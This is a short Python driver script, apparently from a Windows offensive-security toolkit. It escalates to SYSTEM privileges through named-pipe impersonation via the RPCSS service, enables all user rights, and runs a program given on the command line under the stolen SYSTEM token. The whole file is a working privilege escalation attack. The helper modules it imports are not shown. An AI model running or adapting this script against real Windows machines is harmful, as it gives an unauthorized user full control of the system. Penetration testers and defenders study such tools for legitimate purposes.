# -*- coding: UTF-8 -*-
# By Quentin HARDY (quentin.hardy@protonmail.com) - bobsecq

import sys
sys.path.append('../')
from utils import *
configureLogging()
from escalation import Escalation
from impersonate import Impersonate
import subprocess
import time

esc = Escalation()
esc.namedPipeImpersonationSystemViaRPCSS()
imp = Impersonate()
imp.enableAllUserRights() #required, othwerwise not enough privileges
imp.executeWithThreadEffectiveToken(appName=sys.argv[1])